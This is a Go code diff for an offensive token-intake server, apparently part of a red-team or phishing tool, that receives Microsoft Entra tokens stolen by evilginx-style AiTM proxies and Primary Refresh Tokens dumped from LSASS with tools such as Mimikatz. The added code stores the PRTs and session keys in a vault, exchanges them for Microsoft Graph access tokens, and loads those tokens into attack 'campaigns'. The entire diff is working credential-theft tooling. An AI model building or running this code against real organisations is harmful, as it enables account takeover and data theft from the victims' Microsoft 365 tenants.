@@ -14,6 +14,9 @@ import (
 	"time"
 
 	"github.com/bl4cksku11/entraith/internal/campaigns"
+	"github.com/bl4cksku11/entraith/internal/modules/devicecode"
+	prtpkg "github.com/bl4cksku11/entraith/internal/modules/prt"
+	"github.com/bl4cksku11/entraith/internal/store"
 )
 
 // TokenListener is a standalone HTTP server — separate from the operator console
@@ -37,6 +40,7 @@ type TokenListener struct {
 
 	logPath         string
 	mgr             *campaigns.Manager
+	db              *store.Store
 	defaultCampaign string
 
 	// DefaultPort is the configured fallback port used when a start request
@@ -45,9 +49,10 @@ type TokenListener struct {
 }
 
 // NewTokenListener builds a stopped listener. Call Start(port) to bind it.
-func NewTokenListener(mgr *campaigns.Manager, logPath, defaultCampaign string) *TokenListener {
+func NewTokenListener(mgr *campaigns.Manager, db *store.Store, logPath, defaultCampaign string) *TokenListener {
 	return &TokenListener{
 		mgr:             mgr,
+		db:              db,
 		logPath:         logPath,
 		defaultCampaign: defaultCampaign,
 		DefaultPort:     8000,
@@ -67,7 +72,8 @@ type TokenListenerStatus struct {
 }
 
 // tokenIntake is the accepted intake payload. Field names cover the common shapes
-// emitted by AiTM proxies (evilginx-style JSON) and hand-written drops.
+// emitted by AiTM proxies (evilginx-style JSON), PRT captures (LSASS/CloudAP,
+// ROADtoken, AADInternals, Mimikatz), and hand-written drops.
 type tokenIntake struct {
 	AccessToken  string `json:"access_token"`
 	RefreshToken string `json:"refresh_token"`
@@ -79,7 +85,30 @@ type tokenIntake struct {
 	TargetID     string `json:"target_id"`
 	TargetEmail  string `json:"target_email"`
 	Source       string `json:"source"`
+
+	// ─── Primary Refresh Token intake ───────────────────────────────────────
+	// A PRT is not a bearer token: it is stored in the PRT vault and used to
+	// MINT access tokens (needs the session key). Send `prt` (or `prt_token`)
+	// together with `session_key`. When `campaign_id` is present and a session
+	// key is available, the PRT is also exchanged for a Graph access token that
+	// is ingested into the campaign so it is usable in Graph Actions at once.
+	PRT          string `json:"prt"`
+	PRTToken     string `json:"prt_token"` // alias for prt
+	SessionKey   string `json:"session_key"`
+	DeviceCertID string `json:"device_cert_id"`
+	Label        string `json:"label"`
+	UPN          string `json:"upn"`
+	TenantID     string `json:"tenant_id"`
+	// Exchange controls (optional). ClientID/Resource default to Office/Graph.
+	ExClientID string `json:"client_id"`
+	ExResource string `json:"resource"`
 }
+
+// prt returns the PRT material from either the `prt` or `prt_token` field.
+func (t tokenIntake) prt() string { return pickNonEmpty(t.PRT, t.PRTToken) }
+
+// isPRT reports whether this payload carries a Primary Refresh Token.
+func (t tokenIntake) isPRT() bool { return t.prt() != "" }
 
 func (tl *TokenListener) SetDefaultCampaign(id string) {
 	tl.mu.Lock()
@@ -195,6 +224,15 @@ func (tl *TokenListener) handleIntake(w http.ResponseWriter, r *http.Request) {
 	if campaignID == "" {
 		campaignID = defCampaign
 	}
+
+	// A PRT follows its own path: it is stored in the PRT vault (complete), not
+	// the campaign token store, and can then drive every PRT operation. A
+	// campaign is optional here — it is only needed for the auto-exchange step.
+	if intake.isPRT() {
+		tl.ingestPRT(w, r, intake, campaignID)
+		return
+	}
+
 	if campaignID == "" {
 		tl.audit(r, intake, "", "", "no_campaign")
 		writeJSON(w, 400, map[string]string{"error": "campaign_id required (no default campaign configured)"})
@@ -232,6 +270,102 @@ func (tl *TokenListener) handleIntake(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
+// ingestPRT stores a captured Primary Refresh Token in the PRT vault (complete,
+// encrypted at rest) so it shows up under the PRTs list and every PRT operation
+// can use it (→ access token, → SSO cookie). When a campaign and a session key
+// are available it also exchanges the PRT for a Graph access token and ingests
+// that into the campaign, making the PRT usable in Graph Actions right away.
+func (tl *TokenListener) ingestPRT(w http.ResponseWriter, r *http.Request, in tokenIntake, campaignID string) {
+	prtID := fmt.Sprintf("prt-%d", time.Now().UnixNano())
+	upn := pickNonEmpty(in.UPN, in.TargetEmail)
+	label := in.Label
+	if label == "" {
+		label = "listener PRT"
+		if upn != "" {
+			label = "listener PRT — " + upn
+		}
+	}
+
+	if err := tl.db.InsertPRT(store.PRTRow{
+		ID:           prtID,
+		Label:        label,
+		DeviceCertID: in.DeviceCertID,
+		PRTToken:     in.prt(),
+		SessionKey:   in.SessionKey,
+		TargetUPN:    upn,
+		TenantID:     in.TenantID,
+		CreatedAt:    time.Now().UTC(),
+	}); err != nil {
+		tl.audit(r, in, campaignID, upn, "prt_store_error:"+err.Error())
+		writeJSON(w, 500, map[string]string{"error": "failed to store PRT: " + err.Error()})
+		return
+	}
+
+	tl.mu.Lock()
+	tl.ingested++
+	tl.mu.Unlock()
+
+	resp := map[string]interface{}{
+		"status":          "prt_stored",
+		"prt_id":          prtID,
+		"label":           label,
+		"has_session_key": in.SessionKey != "",
+	}
+	outcome := "prt_stored"
+
+	// Optional auto-exchange: PRT → Graph access token → ingest into campaign.
+	// Requires a session key (to sign the assertion) and a target campaign.
+	if campaignID != "" && in.SessionKey != "" {
+		clientID := pickNonEmpty(in.ExClientID, "d3590ed6-52b3-4102-aeff-aad2292ab01c") // Office
+		resource := pickNonEmpty(in.ExResource, "https://graph.microsoft.com")
+		p := &prtpkg.PRT{
+			ID: prtID, Token: in.prt(), SessionKey: in.SessionKey,
+			TargetUPN: upn, TenantID: in.TenantID,
+		}
+		raw, err := prtpkg.ToAccessToken(context.Background(), p, clientID, resource, "")
+		if err != nil {
+			resp["exchange_error"] = err.Error()
+			outcome = "prt_stored;exchange_error"
+		} else {
+			var tok struct {
+				AccessToken  string             `json:"access_token"`
+				RefreshToken string             `json:"refresh_token"`
+				IDToken      string             `json:"id_token"`
+				TokenType    string             `json:"token_type"`
+				ExpiresIn    devicecode.FlexInt `json:"expires_in"`
+				Scope        string             `json:"scope"`
+			}
+			_ = json.Unmarshal(raw, &tok)
+			if tok.AccessToken == "" {
+				resp["exchange_error"] = "PRT exchange returned no access_token"
+				outcome = "prt_stored;exchange_empty"
+			} else if res, ierr := tl.mgr.IngestCapturedToken(campaignID, campaigns.CapturedToken{
+				AccessToken:  tok.AccessToken,
+				RefreshToken: tok.RefreshToken,
+				IDToken:      tok.IDToken,
+				TokenType:    tok.TokenType,
+				ExpiresIn:    int(tok.ExpiresIn),
+				Scope:        tok.Scope,
+				TargetEmail:  upn,
+				Source:       pickNonEmpty(in.Source, "prt-listener"),
+			}); ierr != nil {
+				resp["exchange_error"] = ierr.Error()
+				outcome = "prt_stored;ingest_error"
+			} else {
+				resp["exchanged"] = true
+				resp["campaign_id"] = campaignID
+				resp["target_id"] = res.TargetID
+				resp["target_email"] = res.TargetEmail
+				outcome = "prt_stored;exchanged"
+			}
+		}
+	}
+
+	tl.audit(r, in, campaignID, upn, outcome)
+	log.Printf("[token-listener] PRT stored id=%s upn=%s outcome=%s", prtID, upn, outcome)
+	writeJSON(w, 200, resp)
+}
+
 // parseTokenIntake reads the token payload as JSON (default) or form-urlencoded,
 // selected by Content-Type. Bodies are capped at 1 MiB.
 func parseTokenIntake(r *http.Request) (tokenIntake, error) {
@@ -254,6 +388,15 @@ func parseTokenIntake(r *http.Request) (tokenIntake, error) {
 		in.TargetID = r.PostForm.Get("target_id")
 		in.TargetEmail = r.PostForm.Get("target_email")
 		in.Source = r.PostForm.Get("source")
+		in.PRT = r.PostForm.Get("prt")
+		in.PRTToken = r.PostForm.Get("prt_token")
+		in.SessionKey = r.PostForm.Get("session_key")
+		in.DeviceCertID = r.PostForm.Get("device_cert_id")
+		in.Label = r.PostForm.Get("label")
+		in.UPN = r.PostForm.Get("upn")
+		in.TenantID = r.PostForm.Get("tenant_id")
+		in.ExClientID = r.PostForm.Get("client_id")
+		in.ExResource = r.PostForm.Get("resource")
 	} else {
 		body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
 		if len(body) == 0 {
@@ -263,8 +406,8 @@ func parseTokenIntake(r *http.Request) (tokenIntake, error) {
 			return in, fmt.Errorf("invalid JSON body")
 		}
 	}
-	if in.AccessToken == "" && in.RefreshToken == "" && in.IDToken == "" {
-		return in, fmt.Errorf("at least one of access_token, refresh_token, id_token required")
+	if !in.isPRT() && in.AccessToken == "" && in.RefreshToken == "" && in.IDToken == "" {
+		return in, fmt.Errorf("payload must carry a prt, or at least one of access_token, refresh_token, id_token")
 	}
 	return in, nil
 }
@@ -276,17 +419,21 @@ func parseTokenIntake(r *http.Request) (tokenIntake, error) {
 // usable secrets.
 func (tl *TokenListener) audit(r *http.Request, in tokenIntake, campaignID, targetEmail, outcome string) {
 	entry := map[string]interface{}{
-		"campaign_id":   campaignID,
-		"target_email":  targetEmail,
-		"outcome":       outcome,
-		"has_access":    in.AccessToken != "",
-		"has_refresh":   in.RefreshToken != "",
-		"has_id":        in.IDToken != "",
-		"access_token":  redactToken(in.AccessToken),
-		"refresh_token": redactToken(in.RefreshToken),
-		"id_token":      redactToken(in.IDToken),
-		"scope":         in.Scope,
-		"source":        in.Source,
+		"campaign_id":     campaignID,
+		"target_email":    targetEmail,
+		"outcome":         outcome,
+		"has_access":      in.AccessToken != "",
+		"has_refresh":     in.RefreshToken != "",
+		"has_id":          in.IDToken != "",
+		"has_prt":         in.isPRT(),
+		"has_session_key": in.SessionKey != "",
+		"access_token":    redactToken(in.AccessToken),
+		"refresh_token":   redactToken(in.RefreshToken),
+		"id_token":        redactToken(in.IDToken),
+		"prt":             redactToken(in.prt()),
+		"session_key":     redactToken(in.SessionKey),
+		"scope":           in.Scope,
+		"source":          in.Source,
 	}
 	b, _ := json.Marshal(entry)
 	writeWebhookLogEntryWithType(tl.logPath, r.RemoteAddr, r.Method, r.URL.Path, "json", b, "token_ingest")
